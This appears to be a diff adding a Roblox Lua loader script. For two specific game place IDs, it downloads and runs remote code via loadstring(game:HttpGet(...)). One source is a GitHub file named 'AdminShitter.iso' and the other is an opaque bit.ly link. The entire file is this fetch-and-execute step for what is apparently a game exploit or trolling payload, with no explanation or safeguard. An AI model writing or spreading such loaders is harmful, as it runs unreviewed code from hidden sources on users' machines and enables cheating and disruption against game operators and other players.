@@ -1,0 +1,9 @@
+local a = game.PlaceID
+
+if a == 333164326 then
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQax/WTF/main/AdminShitter.iso"))() --Loadstring
+
+elseif a == 663655429 then -- Place ID / Game ID
+loadstring(game:HttpGet("https://bit.ly/PickASideRoblox"))() --Loadstring
+
+
